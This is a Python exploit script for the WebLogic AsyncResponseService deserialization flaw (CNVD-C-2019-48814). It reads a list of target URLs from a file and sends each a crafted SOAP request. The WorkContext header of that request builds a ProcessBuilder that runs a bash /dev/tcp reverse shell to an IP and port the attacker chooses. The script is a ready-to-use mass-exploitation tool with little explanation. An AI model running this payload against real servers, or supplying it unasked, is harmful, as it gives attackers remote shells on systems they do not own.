from requests import post
from sys import argv

def poc(tag, ip, port):

    url = tag+"/_async/AsyncResponseService"
    data = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i >&amp; /dev/tcp/%s/%s 0>&amp;1</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
    ''' % (ip, port)
    headers = {'content-type': 'text/xml'}
    try:
        print('正在测试'+tag)
        res = post(url, data=data, headers=headers)
        print(res.content.strip())
        print('请查看shell')
    except:
        print('无漏洞')
    print('-------------')

def begin(fileName, ip, port):

    print('''
 _____  _   _  _   _ ______          _____          _____  _____  __   _____            ___  _____  _____  __     ___ 
/  __ \| \ | || | | ||  _  \        /  __ \        / __  \|  _  |/  | |  _  |          /   ||  _  ||  _  |/  |   /   |
| /  \/|  \| || | | || | | | ______ | /  \/ ______ `' / /'| |/' |`| | | |_| | ______  / /| | \ V /  \ V / `| |  / /| |
| |    | . ` || | | || | | ||______|| |    |______|  / /  |  /| | | | \____ ||______|/ /_| | / _ \  / _ \  | | / /_| |
| \__/\| |\  |\ \_/ /| |/ /         | \__/\        ./ /___\ |_/ /_| |_.___/ /        \___  || |_| || |_| |_| |_\___  |
 \____/\_| \_/ \___/ |___/           \____/        \_____/ \___/ \___/\____/             |_/\_____/\_____/\___/    |_/
 
 by cances
 eg. python CNVD-C-2019-48814.py tag.txt vspip vsport
                                                                                                                                                                                                                                         
  ''')
    with open(fileName, 'r') as f:
        tags = f.readlines()
        for tag in tags:
            poc(tag.strip(), ip, port)

begin(argv[1], argv[2], argv[3])